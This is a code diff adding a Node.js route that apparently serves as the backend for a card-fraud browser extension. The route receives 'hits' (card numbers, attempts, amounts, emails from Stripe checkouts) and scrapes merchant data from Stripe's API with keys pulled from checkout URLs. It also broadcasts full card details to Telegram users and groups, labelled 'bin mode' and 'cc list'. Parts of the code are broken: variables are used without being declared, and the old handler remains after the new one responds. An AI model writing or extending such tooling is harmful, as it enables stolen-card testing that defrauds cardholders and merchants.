@@ -602,6 +602,291 @@ router.post('/notify-hit', async (req, res) => {
 
   if (!BOT_TOKEN) {
     console.error('[HIT_NOTIFICATION] ❌ Bot token not configured - notifications will fail');
+    return res.status(500).json({ ok: false, error: 'Bot token not configured' });
+  }
+  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url, hit_mode } = req.body || {};
+  // success_url is no longer sent by extension, so we can remove it from processing
+  const tgId = String(tg_id || '').trim();
+
+  try {
+    // Debug logging for incoming data
+    console.log('[HIT_NOTIFICATION] RECEIVED FROM EXTENSION:', {
+      tg_id: tgId,
+      name: name || 'NO_NAME',
+      card: card || 'NO_CARD_DATA',
+      attempts: attempts || 'NO_ATTEMPTS',
+      amount: amount || 'NO_AMOUNT_DATA',
+      email: email || 'NO_EMAIL_DATA',
+      time_sec: time_sec || 'NO_TIME',
+      current_url: current_url || merchant_url || 'NO_URL'
+    });
+    console.log('[HIT_NOTIFICATION] Raw request body:', req.body);
+
+    // Accept any Telegram ID for debugging
+    console.log('[HIT_NOTIFICATION] Processing with Telegram ID:', tgId);
+
+    // Don't validate - just accept whatever data we get
+    console.log('Processing hit notification with data:', { card, attempts, amount, email });
+    const userName = name || 'User';
+    const tgIdNum = String(tgId).replace(/\D/g, '');
+    const nameLink = tgIdNum ? `<a href="tg://user?id=${tgIdNum}">${userName}</a>` : userName;
+    const amtDisplay = (amount && String(amount).trim()) || '—';
+    let amtFormatted = amtDisplay;
+    if (amtDisplay !== 'Free Trial' && amtDisplay !== '—' && !/^[\$€£]/.test(amtDisplay)) {
+      const num = amtDisplay.replace(/[^\d.]/g, '') || '0';
+      amtFormatted = '₹' + (parseFloat(num).toFixed(2));
+    }
+    let businessUrl = '—';
+    let fullCheckoutUrl = '—';
+
+    // Extract merchant name - prioritize business_url, then auto-fetch from checkout URL, then URL detection, then BIN detection
+    let merchantName = 'Unknown'; // Default - keep short
+    console.log('[HIT_NOTIFICATION] Extension data - current_url:', current_url, 'merchant_url:', merchant_url, 'business_url:', business_url);
+
+    // Priority 1: business_url (exact merchant from Stripe checkout session - sent by extension)
+    if (business_url && typeof business_url === 'string' && business_url.trim()) {
+      businessUrl = business_url.trim();
+      // Use the full business_url as merchant name (remove https:// prefix)
+      merchantName = business_url.replace(/^https?:\/\//, '').replace(/\/$/, '');
+      console.log('[HIT_NOTIFICATION] ✅ Using business_url from extension:', merchantName);
+    }
+
+    // Priority 2: Auto-fetch business_url from checkout URL using cc script logic
+    if (current_url && current_url.includes('checkout.stripe.com')) {
+      try {
+        console.log('[HIT_NOTIFICATION] 🔍 Attempting to extract merchant using cc script logic from checkout URL');
+        const parsedUrl = parseCheckoutUrl(current_url);
+        if (parsedUrl.success && parsedUrl.publicKey) {
+          console.log('[HIT_NOTIFICATION] 🎯 CC SCRIPT: Found publishable key, fetching merchant data...');
+
+          // Use the extracted key to get merchant info
+          const apiUrl = `https://api.stripe.com/v1/payment_pages/${parsedUrl.sessionId}?key=${parsedUrl.publicKey}&eid=NA`;
+
+          const response = await new Promise((resolve, reject) => {
+            const request = https.get(apiUrl, {
+              headers: {
+                'accept': 'application/json',
+                'accept-language': 'en',
+                'cache-control': 'no-cache',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://checkout.stripe.com',
+                'referer': 'https://checkout.stripe.com/',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+              },
+              timeout: 15000
+            }, (res) => {
+              let data = '';
+              res.on('data', (chunk) => data += chunk);
+              res.on('end', () => {
+                try {
+                  resolve({ status: res.statusCode, data: JSON.parse(data) });
+                } catch (e) {
+                  resolve({ status: res.statusCode, data: null, error: e.message });
+                }
+              });
+            });
+
+            request.on('error', (error) => reject(error));
+            request.on('timeout', () => {
+              request.destroy();
+              reject(new Error('Timeout'));
+            });
+          });
+
+          if (response.status === 200 && response.data) {
+            // Extract merchant info - use business_url directly
+            if (response.data.account_settings && response.data.account_settings.business_url) {
+              const businessUrl = response.data.account_settings.business_url;
+              // Use the full business_url as merchant name (remove https:// prefix)
+              merchantName = businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
+              console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Merchant extracted as:', merchantName);
+            } else if (response.data.account_settings && response.data.account_settings.display_name) {
+              merchantName = response.data.account_settings.display_name;
+              console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Merchant extracted as:', merchantName);
+            } else {
+              console.log('[HIT_NOTIFICATION] ⚠️ CC SCRIPT: API call successful but no merchant data found');
+              merchantName = 'Stripe Checkout';
+            }
+
+            // Extract customer email if not provided by extension
+            if (emailDisplay === '—' && response.data.customer_email) {
+              emailDisplay = response.data.customer_email;
+              console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Email extracted as:', emailDisplay);
+            }
+
+            // Extract amount for personal message if we have checkout data
+            // Try different amount fields depending on checkout type
+            let amountCents = null;
+            let currency = 'USD';
+
+            // Prefer USD equivalent if available
+            if (response.data.line_item_group && response.data.line_item_group.localized_prices_metas) {
+              const usdMeta = response.data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
+              if (usdMeta && usdMeta.total) {
+                amountCents = usdMeta.total;
+                currency = 'USD';
+                console.log('[HIT_NOTIFICATION] ✅ Using USD equivalent amount');
+              }
+            }
+
+            // Fallback to checkout currency amounts
+            if (amountCents === null) {
+              if (response.data.amount_total) {
+                amountCents = response.data.amount_total;
+              } else if (response.data.line_item_group && response.data.line_item_group.total) {
+                amountCents = response.data.line_item_group.total;
+              } else if (response.data.recurring_details && response.data.recurring_details.total) {
+                amountCents = response.data.recurring_details.total;
+              }
+
+              if (response.data.currency) {
+                currency = response.data.currency.toUpperCase();
+              }
+            }
+
+            if (amountCents !== null) {
+              const amountValue = (amountCents / 100).toFixed(2);
+              // Use currency symbols after amount as requested
+              const currencySymbol = currency === 'INR' ? '₹' : currency === 'USD' ? '$' : currency === 'EUR' ? '€' : currency === 'GBP' ? '£' : '$';
+              displayAmount = `${amountValue}${currencySymbol}`;
+              console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Amount extracted as:', displayAmount, `(${currency})`);
+            }
+          } else {
+            console.log('[HIT_NOTIFICATION] ❌ CC SCRIPT: API call failed with status:', response.status);
+            merchantName = 'Stripe Checkout';
+          }
+        } else {
+          console.log('[HIT_NOTIFICATION] ❌ CC SCRIPT: Could not extract key from checkout URL');
+          merchantName = 'Stripe Checkout';
+        }
+      } catch (error) {
+        console.error('[HIT_NOTIFICATION] ❌ CC SCRIPT ERROR:', error.message);
+        merchantName = 'Stripe Checkout';
+      }
+    }
+    // Priority 3: URL-based detection
+    else if (current_url || merchant_url) {
+      const pageUrl = current_url || merchant_url;
+      try {
+        merchantName = detectMerchant(pageUrl);
+        console.log('[HIT_NOTIFICATION] ✅ Detected merchant from URL:', merchantName);
+      } catch (error) {
+        console.error('[HIT_NOTIFICATION] ❌ Error detecting merchant from URL');
+        merchantName = 'Payment Processor';
+      }
+    } else {
+      console.log('[HIT_NOTIFICATION] ❌ No URL provided by extension, checking if we have merchant from other sources');
+
+      // Only use BIN detection if we don't already have a real merchant name
+      const genericMerchants = ['Unknown', 'Unknown Merchant', 'Payment Processor', 'Stripe Checkout', 'Online Payment'];
+      const binBasedMerchants = ['Visa Payment', 'Mastercard Payment', 'Mastercard Network', 'American Express', 'Diners Club', 'JCB Payment', 'Discover Payment', 'China UnionPay'];
+
+      if (genericMerchants.includes(merchantName) || binBasedMerchants.includes(merchantName) || !merchantName || merchantName.trim() === '') {
+        console.log('[HIT_NOTIFICATION] Using BIN detection as fallback');
+
+        // Enhanced BIN-based merchant detection
+        const cleanCard = card && card.trim() ? card.replace(/\|/g, '').replace(/\s/g, '') : '';
+        if (cleanCard && cleanCard.length >= 6) {
+          const bin = cleanCard.substring(0, 6);
+          console.log('[HIT_NOTIFICATION] Card BIN detected:', bin);
+
+          // Enhanced BIN patterns for more accurate merchant detection
+          if (bin.startsWith('4')) {
+            merchantName = 'Visa Payment';
+          } else if (bin.startsWith('5') || bin.startsWith('2')) {
+            // More specific Mastercard detection
+            const binNum = parseInt(bin);
+            if (binNum >= 510000 && binNum <= 559999) {
+              merchantName = 'Mastercard Payment';
+            } else if (binNum >= 222100 && binNum <= 272099) {
+              merchantName = 'Mastercard Network';
+            } else {
+              merchantName = 'Mastercard Payment';
+            }
+          } else if (bin.startsWith('3')) {
+            // American Express, Diners Club, JCB
+            const binNum = parseInt(bin);
+            if (binNum >= 340000 && binNum <= 349999) {
+              merchantName = 'American Express';
+            } else if (binNum >= 360000 && binNum <= 369999) {
+              merchantName = 'Diners Club';
+            } else if (binNum >= 352800 && binNum <= 358999) {
+              merchantName = 'JCB Payment';
+            } else {
+              merchantName = 'American Express';
+            }
+          } else if (bin.startsWith('6')) {
+            // Discover, China UnionPay
+            const binNum = parseInt(bin);
+            if (binNum >= 601100 && binNum <= 601199) {
+              merchantName = 'Discover Payment';
+            } else if (binNum >= 622126 && binNum <= 622925) {
+              merchantName = 'China UnionPay';
+            } else if (binNum >= 624000 && binNum <= 626999) {
+              merchantName = 'China UnionPay';
+            } else if (binNum >= 628200 && binNum <= 628899) {
+              merchantName = 'China UnionPay';
+            } else {
+              merchantName = 'Discover Payment';
+            }
+          } else {
+            merchantName = 'Unknown Payment';
+          }
+          console.log('[HIT_NOTIFICATION] ✅ BIN detection result:', merchantName);
+        }
+      }
+    }
+
+    // Send personal notification to user
+    console.log('[HIT_NOTIFICATION] 📱 Sending personal notification to user...');
+    const personalMessage = `🎯 <b>HIT SUCCESS!</b>\n\n🏪 <b>Merchant:</b> ${merchantName}\n💳 <b>Card:</b> <code>${card || 'N/A'}</code>\n💰 <b>Amount:</b> ${amtFormatted}\n📧 <b>Email:</b> ${email || 'N/A'}\n⏱️ <b>Time:</b> ${time_sec || 0}s\n🔢 <b>Attempts:</b> ${attempts || 1}\n\n✅ <b>Payment charged successfully!</b>`;
+
+    try {
+      const personalResult = await sendMessage(BOT_TOKEN, tgId, personalMessage);
+      console.log('[HIT_NOTIFICATION] ✅ Personal notification sent successfully');
+    } catch (personalError) {
+      console.error('[HIT_NOTIFICATION] ❌ Failed to send personal notification:', personalError.message);
+      // Don't fail the whole request for personal notification failure
+    }
+
+    // Send group notifications
+    console.log('[HIT_NOTIFICATION] 📢 Sending group notifications...');
+    const hitData = {
+      userId: tgId,
+      userName: userName,
+      card: card || '',
+      merchant: merchantName,
+      amount: amtFormatted,
+      email: email || '',
+      attempts: attempts || 1,
+      timeTaken: `${time_sec || 0}s`,
+      bin: '', // Will be extracted in sendHitToGroups
+      binMode: hit_mode === 'bin_mode' ? '(Bin Mode)' : hit_mode === 'cc_list' ? '(cc list)' : ''
+    };
+
+    try {
+      console.log('[HIT_NOTIFICATION] 🚨🚨🚨 IMMEDIATELY BEFORE sendHitToGroups CALL 🚨🚨🚨');
+      console.log('[HIT_NOTIFICATION] hitData prepared:', JSON.stringify(hitData, null, 2));
+
+      await sendHitToGroups(hitData, current_url || 'https://extension-hit.com');
+      console.log('[HIT_NOTIFICATION] ✅✅✅ sendHitToGroups FINISHED SUCCESSFULLY ✅✅✅');
+    } catch (groupError) {
+      console.error('[HIT_NOTIFICATION] ❌❌❌ sendHitToGroups CRASHED ❌❌❌');
+      console.error('[HIT_NOTIFICATION] Error:', groupError.message);
+      console.error('[HIT_NOTIFICATION] Stack:', groupError.stack);
+    }
+
+    console.log('[HIT_NOTIFICATION] 🎉 All notifications processed successfully!');
+    res.json({ ok: true, message: 'Hit notifications sent successfully' });
+
+  } catch (error) {
+    console.error('[HIT_NOTIFICATION] ❌ CRITICAL ERROR:', error.message);
+    console.error('[HIT_NOTIFICATION] Stack trace:', error.stack);
+    res.status(500).json({ ok: false, error: 'Internal server error', details: error.message });
+  }
+
+  if (!BOT_TOKEN) {
+    console.error('[HIT_NOTIFICATION] ❌ Bot token not configured - notifications will fail');
     // Don't reject, just log warning
   }
   const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url, hit_mode } = req.body || {};
